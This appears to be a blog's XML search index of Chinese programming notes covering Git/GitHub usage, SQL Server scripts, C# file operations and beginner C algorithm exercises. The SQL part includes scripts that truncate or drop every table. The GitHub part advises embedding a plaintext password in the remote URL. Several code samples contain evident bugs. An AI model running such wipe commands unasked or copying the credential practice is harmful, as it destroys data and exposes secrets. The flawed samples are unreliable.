V0.1创建标签//推荐为软件发布创建标签。这个概念在SVN中也有。//创建一个叫做1.0.0的标签:$ git tag 1.0.0 1b2e1d63ff //1b2e1d63ff是你想要标记的提交 ID 的前 10 位字符。//创建带有注释的标签$ git tag -a V0.1 -m "版本0.1" 删除标签$ git tag -d tagName推送tag到远程仓库$ git push origin --tags2.9 日志、差别对比2.9.1 日志基本使用log//查看提交日志，不带参数，按提交时间列出所有的更新，最近的更新排在最上面$ git log//查看所有操作日志$ git reflog//只显示指定文件的日志信息$ git log README.mdshow$ git show//显示最后 5 次的文件改变的具体内容$ git show commitid//显示某个 commitid 改变的具体内容whatchanged$ git whatchanged --stat每次修改的文件列表, 及文件修改的统计选项(Option)-p$ git log -p -2 README.md//-p 选项展开显示每次提交的内容差异，-2 则仅显示最近的两次更新：&#x2013;stat$ git log --stat -1$ git log --name-status -1//--stat 选项仅显示简要的增改行数统计，--shortstat 选项只显示，--name-status 每次修改的文件列表, 显示状态&#x2013;graph//以图表形式输出分支提交日志$ git log --graph&#x2013;word-diff//--word-diff 选项，进行单词层面上的对比。你需要在书籍、论文这种很大的文本文件上进行对比的时候，这个功能就显出用武之地了。$ git log -U1 --word-diff//-U1，表示希望上下文（ context ）行数从默认的 3 行，减为 1 行 &#x2013;pretty//--pretty 选项指定使用完全不同于默认格式的方式展示提交历史// 将每个提交放在一行显示$ git log --pretty=oneline// 另外还有short，full，fuller 和 format 可以用。format可以定制要显示的记录格式，这样的输出便于后期编程提取分析&#x2013;name-only仅在提交信息后显示已修改的文件清单。&#x2013;name-status显示新增、修改、删除的文件清单。&#x2013;abbrev-commit仅显示 SHA-1 的前几个字符，而非所有的 40 个字符。&#x2013;relative-date使用较短的相对时间显示（比如，“2 weeks ago”）。2.9.2 差别对比//查看更改前后的差别$git diff //查看工作树和最新提交的差别$git diff HEAD2.10 实用小贴士// 内建的图形化 git：$ gitk//彩色的 git 输出：$ git config color.ui true//显示历史记录时，每个提交的信息只显示一行：$ git config format.pretty oneline//交互式添加文件到暂存区：$ git add -i// 本地分支重名名$ git branch -m oldName newName// 远程分支重命名$ git branch -m oldName newName$ git push --delete origin oldName // 删除远程分支$ git push origin newName // 上传新命名的本地分支$ git branch --set-upstream-to=origin/newName2.11 问题处理2.11.1 git: fatal: I don't handle protocol 'https'fatal：I don't handle protocol 'https'2.11.2 error: RPC failed; curl 56 GnuTLS recv error (-9): A TLS packet with unexpected length was received解决：$ sudo apt purge git$ sudo apt install git2.11.3 git pull：fatal: refusing to merge unrelated histories合并pull两个不同的项目，问题解决：假若我在 Github 新建了一个仓库，在本地又初始化了一个新仓库，并且添加了很多与 Github 内容不同的文件和代码。此时，想把本地代码与远程 Github 仓库的代码合并，于是，通过 git pull origin master 命令拉取代码(origin 就是仓库，而 master 就是需要上传的分支)；然后，就输出 refusing to merge unrelated histories。因为是不同的两个仓库，要把两个不同的项目合并，需要添加 &#x2013;allow-unrelated-histories 告诉 git 允许不相关历史合并，这句代码是在git 2.9.2版本发生的。假如我们的源是origin，分支是master，那么需要这样写：$ git pull origin master --allow-unrelated-histories如果有设置了默认上传分支就可以用下面代码：$ git pull --allow-unrelated-histories3 GitHub3.1 Introduction官网地址：https://github.com/GitHub是一个利用Git进行版本控制、专门用于存放软件代码与内容的共享虚拟主机服务。它由GitHub公司（曾称Logical Awesome）的开发者Chris Wanstrath、PJ Hyett和Tom Preston-Werner使用Ruby on Rails编写而成。GitHub同时提供付费账户和免费账户。3.2 一些基本概念Repository(仓库)用于存放项目源代码。Star(收藏)收藏项目Fork(复制克隆项目)Pull Request(发送请求)基于Fork，修改或删除代码提交请求。Watch(关注)假设项目有任何更新，第一时间收到通知消息。Issue(事务卡片)发现了代码存在BUG，但是目前没有成型代码，需要讨论时使用。3.3 上传代码方式3.3.1 SSH方式传输使用SSH方式，在提交时，不需要输入用户名和密码。首先在本地创建ssh key，一直回车。$ ssh-keygen -t rsa -C "your_email@youremail.com"//成功的话会在~/目录下生成.ssh文件夹，进入.ssh目录，打开id_rsa.pub文件，复制里面的key。进入github官网上，点击个人中心的 Account Settings（账户配置），左边选择"SSH Keys" &gt; "Add SSH Key",title自定义填写，然后将复制的key粘贴到GitHub的文本框中。下面是添加好的SSH Keys示例：验证是否成功:$ ssh -T git@github.com 3.3.2 HTTPS方式传输使用条件：1）本地配置了global；2）需要输入用户名和密码推送代码3.3.3 配置免登录提交代码$ vim .git/config[remote "origin"]url=https://github.com/用户名/仓库名.git修改为：[remote "origin"]url=https://用户名:密码@github.com/用户名/仓库名.git3.4 开源项目贡献流程新建Issue：提交问题或建议或想法。Pull Request：Fork项目，修改代码，发起修改请求。方式一通过 Github 网站图形化操作，New pull request.方式二使用 git 命令操作。$ git remote -v$ git remote add upstream https://github.com/xxx/xxx.git// $ git remote remove upstream$ git fetch upstream // 从源仓库同步代码$ git merge upstream/master //合并到本地分支$ git push3.5 使用Github Pages搭建网站3.5.1 新建仓库搭建创建个人站点，新建仓库。（注：仓库名必须为【用户名.github.io】）在新建的仓库下，新建index.html文件即可。注：(1)Github Pages仅支持静态网页;(2)仓库里面只能是.html文件3.5.2 项目仓库下搭建进入项目仓库主页，点击settings。找到【Github Pages】，点击【Change theme】，选择主题来自动生成主题页面。访问：https://%E7%94%A8%E6%88%B7%E5%90%8D.github.io/%E4%BB%93%E5%BA%93%E5%90%8D4 ReferencesGit分支git v2GitHub官网Windows下安装和使用Git（Cygwin篇）git - 简易指南GIT和SVN之间的五个基本区别《GitHub入门与实践》[日]大塚弘记  //书籍同步更新Fork项目.3 Git 基础 - 查看提交历史]]></content>
      <categories>
        
          <category> software </category>
        
      </categories>
      <tags>
        
          <tag> SVN(Subversion) </tag>
        
          <tag> Git </tag>
        
          <tag> GitHub </tag>
        
      </tags>
      <tags></tags>
    </entry>
  
    <entry>
      <title><![CDATA[SQL Script]]></title>
      <url>/database/2014/07/18/sql-script/</url>
      <content type="text"><![CDATA[Welcome you to mail to zrg1390556487@gmail.com, Thank you!!!1 常用SQL语句1.1 Table1.1.1 Create Tablecreate table TableName(id int(10) not null primary key auto_increment,name varchar(20) not null,password varchar(45) not null,sex int(4) not null default '0',);1.1.2 Alter Tablealter table TableName characiter set=utf8mb4,collate=utf8mb4_general_ci1.2 增删改查/清空1.2.1 新增insert into TableName(id,name,password) values('1','&#23385;&#24735;&#31354;','sduwe9uifsdddssdf23qfuieqwerq');1.2.2 删除delete from TableName where id='1';1.2.3 修改update TableName set name='&#23385;&#24735;&#31354;' where id='1'1.2.4 查询select * from TableName;select id,name,password from TableName;1.2.5 清空truncate table TableName;1.3 索引/视图/事务处理/存储过程1.3.1 索引1.3.2 视图create view ViewName AS    select ...1.4 触发器/游标2 高级查询2.1 以某个字段进行分组查询，每组前n条记录select res.* from( select * from View_ArticleChannel a where a.ID in(        select top 3 ID from View_ArticleChannel where a.ChannelName=ChannelName order by a.ChannelName DESC )) as reswhere res.ChannelName in('&#29289;&#27969;&#20844;&#21496;','&#20113;&#20179;&#20844;&#21578;')-- group by res.ID,res.ChannelName,res.Titleorder by res.ChannelName2.2 根据当天日期判断使用哪个字段排序（case&#x2026;when&#x2026;else&#x2026;end）select card_no from Customer_V_InTruckInfo where card_no like '%dm16%' order by (  case      when 19%2=0 then name      else truck_no end)-- &#22914;&#26524;&#20351;&#29992;C#&#20195;&#30721;&#65292;19&#21487;&#26367;&#25442;&#20026;:"+DateTime.Now.Day+"2.3 分组获取记录的第一条数据select * from(SELECT   ROW_NUMBER()over(partition by VehicleId order by CreateTime DESC) as RowNumber,ID, VehicleId, VehicleNo, Driver, DriverPhone, ContactType,                 (CASE ContactType WHEN '1' THEN '&#30701;&#20449;' WHEN '2' THEN '&#30005;&#35805;' END) AS ContactType_ex, ContactContent, CreateUser,                 CreateTime, ModifyUser, ModifyTime, ContactResult,                 (CASE ContactResult WHEN '1' THEN '&#26377;&#24847;&#21521;' WHEN '2' THEN '&#26080;&#24847;&#21521;' WHEN '3' THEN '&#20572;&#21345;' END)                 AS ContactResult_ex, NextContactTime, ContactPersonIdea, IsDelete, ExtendField1, ExtendField2, ExtendField3,                 ExtendField4, ExtendField5FROM      dbo.VehicleTrackInfo) AS trackwhere track.RowNumber=1and track.VehicleId='95654e2ffb134f6581f94aa5ed178529'3 其他操作3.1 使用SQL语句清空数据库中所有表的数据表非常多,一张一张的清空,实在麻烦,想利用SQL语句一次清空所有数据.找到了三种方法进行清空.使用的数据库为MS SQL SERVER.3.1.1 Method 1:搜索出所有表名,构造为一条SQL语句declare @trun_name varchar(8000)set @trun_name=''select @trun_name=@trun_name + 'truncate table ' + [name] + ' ' from sysobjects where xtype='U' and status &gt; 0exec (@trun_name)该方法适合表不是非常多的情况,否则表数量过多,超过字符串的长度,不能进行完全清理.3.1.2 Method 2:利用游标清理所有表declare @trun_name varchar(50)declare name_cursor cursor forselect 'truncate table' + name from sysobjects where xtype='U' and status &gt; 0open name_cursorfetch next from name_cursor into @trun_namewhile @@FETCH_STATUS = 0begin  exec (@trun_name)  print 'truncated table' + @trun_name  fetch next from name_cursor into @trun_nameendclose name_cursordeallocate name_cursor可以做为存储过程调用, 能够一次清空所有表的数据,并且还可以进行有选择的清空表.3.1.3 Method 3:利用微软未公开的存储过程exec sp_msforeachtable "truncate table ?"该方法可以一次清空所有表,但不能加过滤条件.附-删除表：exec sp_msforeachtable 'DROP table ?'3.2 SQL Server修改表名前的用户1.只修改表前用户EXEC sp_MSforeachtable 'exec sp_changeobjectowner "？","dbo" '2.用户表/存储过程/视图/触发器/自定义函数一起改declare tb cursor local forselect 'sp_changeobjectowner ''['+replace(user_name(uid),']',']]')+'].['+replace(name,']',']]')+']'',''dbo'''from sysobjects where xtype in('U','V','P','TR','FN','IF','TF') and status&gt;=0open tbdeclare @s nvarchar(4000)fetch tb into @swhile @@fetch_status=0beginexec(@s)fetch tb into @sendclose tbdeallocate tb]]></content>
      <categories>
        
          <category> database </category>
        
      </categories>
      <tags>
        
          <tag> SQL </tag>
        
      </tags>
      <tags></tags>
    </entry>
  
    <entry>
      <title><![CDATA[C# 文件操作]]></title>
      <url>/c%23/2014/06/10/C-file/</url>
      <content type="text"><![CDATA[如果您遇到任何问题，请发送邮件至zrg1390556487@gmail.com。1 文件操作1.1 文件名处理//&#26367;&#25442;&#25481;&#38750;&#27861;&#23383;&#31526;fileName = fileName.Replace(":", "_").Replace(" ", "_").Replace("\\", "_").Replace("/", "_");1.2 获取目录下所有文件的文件名String path = @"X:\xxx\xxx";//&#31532;&#19968;&#31181;&#26041;&#27861;var files = Directory.GetFiles(path, "*.txt");foreach (var file in files)    Console.WriteLine(file);//&#31532;&#20108;&#31181;&#26041;&#27861;DirectoryInfo folder = new DirectoryInfo(path);foreach (FileInfo file in folder.GetFiles("*.txt")){    Console.WriteLine(file.FullName);}1.3 C#判断文件和目录是否存在，不存在则创建&#25991;&#20214;&#65306;if (File.Exists(Server.MapPath("~/upimg/Data.html"))){   File.Create(MapPath("~/upimg/Data.html"));//&#21019;&#24314;&#35813;&#25991;&#20214;}&#25991;&#20214;&#22841;&#65306;if (!Directory.Exists(Server.MapPath("~/upimg/hufu"))){   Directory.CreateDirectory(Server.MapPath("~/upimg/hufu"));}1.4 删除文件/// &lt;summary&gt;/// &#21024;&#38500;&#21333;&#20010;&#25991;&#20214;/// &lt;/summary&gt;/// &lt;param name="_filepath"&gt;&#25991;&#20214;&#30456;&#23545;&#36335;&#24452;&lt;/param&gt;public static bool DeleteFile(string _filepath){   if (string.IsNullOrEmpty(_filepath))   {       return false;   }   string fullpath = GetMapPath(_filepath);   if (File.Exists(fullpath))   {       File.Delete(fullpath);       return true;   }   return false;}/// &lt;summary&gt;/// &#21024;&#38500;&#19978;&#20256;&#30340;&#25991;&#20214;(&#21450;&#32553;&#30053;&#22270;)/// &lt;/summary&gt;/// &lt;param name="_filepath"&gt;&lt;/param&gt;public static void DeleteUpFile(string _filepath){    if (string.IsNullOrEmpty(_filepath))    {        return;    }    string thumbnailpath = _filepath.Substring(0, _filepath.LastIndexOf("/")) + "mall_" + _filepath.Substring(_filepath.LastIndexOf("/") + 1);    string fullTPATH = GetMapPath(_filepath); //&#23487;&#30053;&#22270;    string fullpath = GetMapPath(_filepath); //&#21407;&#22270;    if (File.Exists(fullpath))    {        File.Delete(fullpath);    }    if (File.Exists(fullTPATH))    {        File.Delete(fullTPATH);    }}1.5 返回文件大小KB/// &lt;summary&gt;/// &#36820;&#22238;&#25991;&#20214;&#22823;&#23567;KB/// &lt;/summary&gt;/// &lt;param name="_filepath"&gt;&#25991;&#20214;&#30456;&#23545;&#36335;&#24452;&lt;/param&gt;/// &lt;returns&gt;int&lt;/returns&gt;public static int GetFileSize(string _filepath){    if (string.IsNullOrEmpty(_filepath))    {        return 0;    }    string fullpath = GetMapPath(_filepath);    if (File.Exists(fullpath))    {        FileInfo fileInfo = new FileInfo(fullpath);        return ((int)fileInfo.Length) / 1024;    }    return 0;}1.6 返回文件扩展名，不含“.”/// &lt;summary&gt;/// &#36820;&#22238;&#25991;&#20214;&#25193;&#23637;&#21517;&#65292;&#19981;&#21547;&#8220;.&#8221;/// &lt;/summary&gt;/// &lt;param name="_filepath"&gt;&#25991;&#20214;&#20840;&#21517;&#31216;&lt;/param&gt;/// &lt;returns&gt;string&lt;/returns&gt;public static string GetFileExt(string _filepath){    if (string.IsNullOrEmpty(_filepath))    {        return "";    }    if (_filepath.LastIndexOf(".") &gt; 0)    {        return _filepath.Substring(_filepath.LastIndexOf(".") + 1); //&#25991;&#20214;&#25193;&#23637;&#21517;&#65292;&#19981;&#21547;&#8220;.&#8221;    }    return "";}2 文件下载2.1 TransmitFile方式/* &#24494;&#36719;&#20026;Response&#23545;&#35937;&#25552;&#20379;&#20102;&#19968;&#20010;&#26032;&#30340;&#26041;&#27861;TransmitFile&#26469;&#35299;&#20915;&#20351;&#29992;Response.BinaryWrite&#19979;&#36733;&#36229;&#36807;400MB&#30340;&#25991;&#20214;&#26102;&#65292;&#23548;&#33268;Aspnet_wp.exe&#36827;&#31243;&#22238;&#25910;&#32780;&#26080;&#27861;&#25104;&#21151;&#19979;&#36733;&#30340;&#38382;&#39064;&#12290; &#20195;&#30721;&#22914;&#19979;&#65306;*/Response.ContentType = "application/x-zip-compressed";  string FileName = "test.doc";  //&#20351;&#29992;UTF-8&#23545;&#25991;&#20214;&#21517;&#36827;&#34892;&#32534;&#30721;  Response.AppendHeader("Content-Disposition", "attachment;filename=\"" + HttpUtility.UrlEncode(FileName, System.Text.Encoding.UTF8) + "\"");  Response.ContentType = "application/octet-stream";  Response.AddHeader("Content-Disposition", "attachment;filename=" + FileName);  string filename = Server.MapPath("../ReportTemplate/test.doc");  Response.TransmitFile(filename);  2.2 WriteFile方式/* using System.IO;          */string fileName = "test.doc";//&#23458;&#25143;&#31471;&#20445;&#23384;&#30340;&#25991;&#20214;&#21517;  string filePath = Server.MapPath("../ReportTemplate/test.doc");//&#36335;&#24452;  FileInfo fileInfo = new FileInfo(filePath);  Response.Clear();  Response.ClearContent();  Response.ClearHeaders();  Response.AddHeader("Content-Disposition", "attachment;filename=\"" + HttpUtility.UrlEncode(fileName, System.Text.Encoding.UTF8) + "\"");  Response.AddHeader("Content-Length", fileInfo.Length.ToString());  Response.AddHeader("Content-Transfer-Encoding", "binary");  Response.ContentType = "application/octet-stream";  Response.WriteFile(fileInfo.FullName);  Response.Flush();  Response.End();  2.3 WriteFile分块下载方式string fileName = "test.doc";//&#23458;&#25143;&#31471;&#20445;&#23384;&#30340;&#25991;&#20214;&#21517;  string filePath = Server.MapPath("../ReportTemplate/test.doc");//&#36335;&#24452;System.IO.FileInfo fileInfo = new System.IO.FileInfo(filePath);if (fileInfo.Exists == true)  {      const long ChunkSize = 102400; //100K &#27599;&#27425;&#35835;&#21462;&#25991;&#20214;&#65292;&#21482;&#35835;&#21462;100K&#65292;&#36825;&#26679;&#21487;&#20197;&#32531;&#35299;&#26381;&#21153;&#22120;&#30340;&#21387;&#21147;      byte[] buffer = new byte[ChunkSize];      Response.Clear();      System.IO.FileStream iStream = System.IO.File.OpenRead(filePath);      long dataLengthToRead = iStream.Length; //&#33719;&#21462;&#19979;&#36733;&#30340;&#25991;&#20214;&#24635;&#22823;&#23567;      Response.ContentType = "application/octet-stream";      Response.AddHeader("Content-Disposition",      "attachment; filename=" + HttpUtility.UrlEncode(fileName, System.Text.Encoding.UTF8));      while (dataLengthToRead &gt; 0 &amp;&amp; Response.IsClientConnected)      {          int lengthRead = iStream.Read(buffer, 0, Convert.ToInt32(ChunkSize)); //&#35835;&#21462;&#30340;&#22823;&#23567;          Response.OutputStream.Write(buffer, 0, lengthRead);          Response.Flush();          dataLengthToRead = dataLengthToRead - lengthRead;      }      Response.Close();  }  2.4 流方式下载string fileName = "test.doc";//&#23458;&#25143;&#31471;&#20445;&#23384;&#30340;&#25991;&#20214;&#21517;  string filePath = Server.MapPath("../ReportTemplate/test.doc");//&#36335;&#24452;//&#20197;&#23383;&#31526;&#27969;&#30340;&#24418;&#24335;&#19979;&#36733;&#25991;&#20214; FileStream fs = new FileStream(filePath, FileMode.Open);  byte[] bytes = new byte[(int)fs.Length];  fs.Read(bytes, 0, bytes.Length);  fs.Close();  Response.ContentType = "application/octet-stream";  //&#36890;&#30693;&#27983;&#35272;&#22120;&#19979;&#36733;&#25991;&#20214;&#32780;&#19981;&#26159;&#25171;&#24320;  Response.AddHeader("Content-Disposition", "attachment;  filename=" + HttpUtility.UrlEncode(fileName, System.Text.Encoding.UTF8));  Response.BinaryWrite(bytes);  Response.Flush();  Response.End();3 参考资料http://www.cnblogs.com/CookBlack/archive/2011/04/10/1883864.htmlhttp://www.cnblogs.com/technology/archive/2011/07/12/2104786.html]]></content>
      <categories>
        
          <category> c# </category>
        
      </categories>
      <tags>
        
          <tag> C#-文件操作 </tag>
        
      </tags>
      <tags></tags>
    </entry>
  
    <entry>
      <title><![CDATA[算法之家]]></title>
      <url>/algorithms/2014/05/25/algorithms-family/</url>
      <content type="text"><![CDATA[zrg1390556487@gmail.com1 初级LV.11.1 Hello World#include&lt;stdio.h&gt;void main(){        printf("Hello World!");}1.2 a+b#include&lt;stdio.h&gt;void main(){        int a,b;        printf("Please enter two integers separated by commas!\n");        printf("a=");        scanf("%d",&amp;a);        printf("b=");        scanf("%d",&amp;b);        printf("a+b=%d\n",a+b);}1.3 大小写转换#include&lt;stdio.h&gt;#include&lt;string.h&gt;/** * Conversion * a-z &lt;--&gt; A-Z *///initchar convert(char ch);//mainvoid main(){        int i,j;        int n,length;        char arr[300];        printf("Please enter n value.\n");        scanf("%d",&amp;n);        for(i=0;i&lt;n;i++){                gets(arr);                length=strlen(arr);                for(j=0;j&lt;=n;j++){                        arr[j]=convert(arr[j]);                }                for(j=0;j&lt;length;j++){                        putchar(arr[j]);                }        }}//convertchar convert(char ch){        if(ch&gt;='a'&amp;&amp;ch&lt;='z'){                return ch-32;        }else if(ch&gt;='A'&amp;&amp;ch&lt;='Z'){                return ch+32;        }else{                return ch;        }}1.4 水仙花数#include&lt;stdio.h&gt;/** * &#27700;&#20185;&#33457;&#25968;(Narcissus number) * &#25551;&#36848;&#65306;&#22914;&#26524;&#19968;&#20010;&#19977;&#20301;&#25968;&#30340;&#27599;&#20010;&#25968;&#20301;&#30340;&#19977;&#27425;&#26041;&#21644;&#23601;&#26159;&#26412;&#36523;&#12290; * */int isYes(int n);void main(){        int l,m,n,flag;        printf("Please enter 3-digit interger,Separated by commas!\n");        while(scanf("%d,%d",&amp;m,&amp;n)!=EOF){                flag=0;                for(l=m;l&lt;=n;l++){                        if(isYes(l)){                                flag=1;                                printf("%d ",l);                        }                }                if(flag==0){                        printf("No!");                }        }}int isYes(int n){        int i,j,k;        i=n/100;//&#30334;&#20301;        j=n/10%10;//&#21313;&#20301;        k=n%10;//&#20010;&#20301;        if(n==i*i*i+j*j*j+k*k*k){                return 1;        }else{                return 0;        }}1.5 青蛙王子#include&lt;stdio.h&gt;/** * &#19968;&#20010;&#29579;&#23376;&#34987;&#24043;&#24072;&#35781;&#21650;&#65292;&#8230;&#8230; * */void main(){        unsigned int a,b,c,temp,min;        while(scanf("%u %u %u",&amp;a,&amp;b,&amp;c),a!=0||b!=0||c!=0){                if(a==0&amp;&amp;b==0){                        printf("No\n");                        continue;                }                if(b&gt;a){                        temp=a;                        a=b;                        b=temp;                }                if(b==0){                        min=a;                }                if(a==b){                        min=a;                  }                while(a&gt;b&amp;&amp;b!=0){                        temp=a-b;                        if(temp&gt;b){                                a=temp;                        }else if(temp&lt;b){                                a=b;                                b=temp;                         }else{                                min=temp;                                break;                        }                }                if((c%min)==0){                        printf("Yes\n");                }else{                        printf("No\n");                }        }}1.6 海明距离#include&lt;stdio.h&gt;/** * &#28023;&#26126;&#36317;&#31163;(Haiming Distance) * &#20108;&#36827;&#21046;&#24773;&#20917;&#19979;&#65292;&#19968;&#20010;&#25972;&#25968;&#21464;&#25104;&#21478;&#19968;&#20010;&#25972;&#25968;&#38656;&#35201;&#32763;&#36716;&#30340;&#20301;&#25968;&#12290; * */void main(){        int x,y,m,n;        int dist=0;        printf("Please enter 2-digit integer,Separated by commas!\n");        scanf("%d,%d",&amp;x,&amp;y);        while(x!=0||y!=0){                m=x%2;x=x/2;                n=y%2;y=y/2;                if(m!=n){                        dist++;                }        }        printf("x and y [Haiming Distance]:%d",dist);}1.7 哈密尔顿距离#include&lt;stdio.h&gt;/** * &#21704;&#23494;&#23572;&#39039;&#36317;&#31163; * Hamilton.c * &#26377;&#20004;&#20010;&#28857;P[x1,y1],Q[x2,y2]&#65292;&#23450;&#20041;&#20854;&#21704;&#23494;&#23572;&#39039;&#36317;&#31163;D=|x1-x2|+|y1-y2| * */void main(){        int x1,y1,x2,y2,temp_x,temp_y;        printf("Please enter 4 numbers,each 2 numbers are Separated by commas.Format:'3,4 5,6'\n");        scanf("%d,%d %d,%d",&amp;x1,&amp;y1,&amp;x2,&amp;y2);        if(x1&gt;x2){                temp_x=x1-x2;        }else{                temp_x=x2-x1;        }        if(y1&gt;y2){                temp_y=y1-y2;        }else{                temp_y=y2-y1;        }        printf("result:%d\n",temp_x+temp_y);}1.8 数码平方和#include&lt;stdio.h&gt;/** * &#25968;&#30721;&#24179;&#26041;&#21644; * &#19968;&#20010;&#25972;&#25968;&#21508;&#20010;&#25968;&#30721;&#30340;&#24179;&#26041;&#21644;&#30340;&#20010;&#20301;&#25968;&#25104;&#20026;&#20998;&#31867;&#20540;&#12290;&#32473;&#20320;&#19968;&#20010;&#21306;&#38388;[a,b]&#65292;&#19968;&#20010;&#25968;&#30721;n&#65292;&#27714;&#36825;&#20010;&#21306;&#38388;[a,b]&#20869;&#30340;&#20998;&#31867;&#20540;n&#12290; * */void main(){        int a,b,c,d,e;        printf("Please enter 3 numbers.\n");        scanf("%d,%d,%d",&amp;a,&amp;b,&amp;e);        int i,j,k,n,f,g;                for(i=0;i&lt;=b;i++){                g=i;c=i;                f=0;d=c;                for(;d!=0;){                        c=d%10;                        f=f+c*c;                        d=d/10;                }                f=f%10;                if(f==e){                        k++;                }        }        printf("result:%d\n",k);}1.9 统计字符#include&lt;stdio.h&gt;#include&lt;string.h&gt;/** * Statistics Strings * &#36755;&#20837;&#19968;&#23383;&#31526;&#20018;&#65292;&#35831;&#25214;&#20986;&#20986;&#29616;&#27425;&#25968;&#26368;&#22810;&#30340;&#22823;&#20889;&#23383;&#27597;&#12290; * &#37319;&#29992;&#21704;&#24076;&#26144;&#23556;&#24605;&#24819;&#65292;&#25226;A-Z&#26144;&#23556;&#21040;&#21704;&#24076;&#34920;&#20013;&#20445;&#23384;&#20854;&#20986;&#29616;&#30340;&#27425;&#25968;&#65292;&#26368;&#21518;&#36755;&#20986;&#32467;&#26524;&#12290; * */void main(){        char str[100],z[1000];        int i,j,k,sum[30],a;        gets(z);//&#35835;&#21462;&#23383;&#31526;&#20018;        memset(sum,0,sizeof(str));        for(i=0;i&lt;strlen(z);i++){                sum[z[i]-'A']++;        }        k=0;        for(i=0;i&lt;30;i++){                if(k&lt;sum[i]){                        k=sum[i];                        a=i+'A';                }        }        printf("%c %d\n",a,k);  }1.10 数字塔/** * Digital Tower *    1 *   222 *  33333 * */#include&lt;stdio.h&gt;void main(){        int n;        printf("Please enter any number!\n");        scanf("%d",&amp;n);        int i,j;}1.11 有多少个1#include&lt;stdio.h&gt;#include&lt;stdlib.h&gt;void hanoi(int n,char x,char y,char z);int main(void){        hanoi(6,'A','B','C');        return EXIT_SUCCESS;    }void hanoi(int n,char x,char y,char z){        if(n==0){        }else{                hanoi(n-1,x,z,y);                printf("%c-&gt;%c,",x,y);                hanoi(n-1,z,y,x);        }}1.12 字符串逆序1.13 回文字串1.14 凯撒的密码1.15 最小公倍数1.16 素数判定1.17 素数个数1.18 分数加减法1.19 合法的整数1.20 质因数分解1.21 歌德巴赫猜想1.22 替换空格1.23 队列的实现1.24 栈的实现1.25 循环队列1.26 合并两个有序链表1.27 逆转一个链表1.28 从尾到头打印链表1.29 链表中倒数第k个结点1.30 O(1)时间内删除链表结点2 中级LV.22.1 递归之杨辉三角2.2 递归之斐波那契数列2.3 递归之汉诺塔2.4 分治之二分搜索2.5 旋转数组的最小数字2.6 分治之棋盘覆盖2.7 回溯之全排列2.8 回溯之N皇后问题2.9 NFS深度优先搜索2.10 BFS广度优先搜索2.11 BFS+记录路径2.12 回溯之旅行售货员2.13 回族之0+1背包问题2.14 二叉树遍历3 高级LV.33.1 动态规划之拦截导弹3.2 动态规划之完全背包3.3 动态规划之01背包3.4 动态规划之统计单词个数3.5 最长公共字符子序列3.6 最小生成树Prim算法3.7 最小生成树Kruskal算法3.8 网络流之最大流（EK）3.9 二分图最大匹配算法3.10 最小费用流之飞镖3.11 网络流之方格取数3.12 强联通分量-Kosaraju算法3.13 博弈论之取石子游戏3.14 图论之拓扑排序]]></content>
      <categories>
        
          <category> algorithms </category>
        
      </categories>
      <tags>
        
          <tag> 算法之家 </tag>
        
      </tags>
      <tags></tags>
    </entry>
  
    <entry>
      <title><![CDATA[C# ASP.NET Notes]]></title>
      <url>/c%23/2014/05/10/c-notes/</url>
      <content type="text"><![CDATA[1 字符串操作1.1 String.Substring()//格式String.Substring(int beginIndex)String.Substring(int beginIndex,int endIndex)//示例string str_new=str.Substring(6,2)：表示从str中截取位置为6的字符开始长度为2的字符串，6表示子字符的起始位置，2表示子字符的字符长度。1.2 其他方法//格式int indexOf(String str) 返回第一次出现的指定子字符串在此字符串中的索引。int indexOf(String str, int fromIndex) 从指定的索引处开始，返回第一次出现的指定子字符串在此字符串中的索引。int lastIndexOf(String str) 返回在此字符串中最右边出现的指定子字符串的索引。int lastIndexOf(String str, int fromIndex) 从指定的索引处开始向后搜索，返回在此字符串中最后一次出现的指定子字符串的索引。 int length() 返回此字符串的长度。boolean startsWith(String prefix) 测试此字符串是否以指定的前缀开始。 boolean startsWith(String prefix, int toffset) 测试此字符串是否以指定前缀开始，该前缀以指定索引开始。//示例str.Substring(0,str.LastIndexOf(","));1.3 参考资料http://www.blogjava.net/AndyZhang/archive/2012/04/25/376614.htmlhttp://www.cnblogs.com/rocblog/archive/2013/05/07/3064593.htmlhttp://www.cnblogs.com/Deckard/archive/2009/06/03/1495452.html2 日期时间处理2.1 C#正则表达式判断输入日期格式是否正确/// &lt;summary&gt;/// &#26159;&#21542;&#20026;&#26085;&#26399;&#22411;&#23383;&#31526;&#20018;/// &lt;/summary&gt;/// &lt;param name="StrSource"&gt;&#26085;&#26399;&#23383;&#31526;&#20018;(2008-05-08)&lt;/param&gt;/// &lt;returns&gt;&lt;/returns&gt;public static bool IsDate(string StrSource){     return Regex.IsMatch(StrSource, @"^((((1[6-9]|[2-9]\d)\d{2})-(0?[13578]|1[02])-(0?[1-9]|[12]\d|3[01]))|(((1[6-9]|[2-9]\d)\d{2})-(0?[13456789]|1[012])-(0?[1-9]|[12]\d|30))|(((1[6-9]|[2-9]\d)\d{2})-0?2-(0?[1-9]|1\d|2[0-9]))|(((1[6-9]|[2-9]\d)(0[48]|[2468][048]|[13579][26])|((16|[2468][048]|[3579][26])00))-0?2-29-))$");}/// &lt;summary&gt;/// &#26159;&#21542;&#20026;&#26102;&#38388;&#22411;&#23383;&#31526;&#20018;// &lt;/summary&gt;/// &lt;param name="source"&gt;&#26102;&#38388;&#23383;&#31526;&#20018;(15:00:00)&lt;/param&gt;/// &lt;returns&gt;&lt;/returns&gt;public static bool IsTime(string StrSource){     return Regex.IsMatch(StrSource, @"^((20|21|22|23|[0-1]?\d):[0-5]?\d:[0-5]?\d)$");}/// &lt;summary&gt;/// &#26159;&#21542;&#20026;&#26085;&#26399;+&#26102;&#38388;&#22411;&#23383;&#31526;&#20018;/// &lt;/summary&gt;/// &lt;param name="source"&gt;&lt;/param&gt;/// &lt;returns&gt;&lt;/returns&gt;public static bool IsDateTime(string StrSource){    return Regex.IsMatch(StrSource, @"^(((((1[6-9]|[2-9]\d)\d{2})-(0?[13578]|1[02])-(0?[1-9]|[12]\d|3[01]))|(((1[6-9]|[2-9]\d)\d{2})-(0?[13456789]|1[012])-(0?[1-9]|[12]\d|30))|(((1[6-9]|[2-9]\d)\d{2})-0?2-(0?[1-9]|1\d|2[0-8]))|(((1[6-9]|[2-9]\d)(0[48]|[2468][048]|[13579][26])|((16|[2468][048]|[3579][26])00))-0?2-29-)) (20|21|22|23|[0-1]?\d):[0-5]?\d:[0-5]?\d)$ ");}2.2 C#利用线程、委托，实时显示时间#region &#36816;&#34892;&#26102;&#26174;&#31034;&#23454;&#26102;&#26102;&#38388;new Thread(() =&gt;{        while (true)        {           try           {               labelTime.BeginInvoke(new MethodInvoker(() =&gt; labelTime.Text = DateTime.Now.ToString()));           }           catch (Exception)           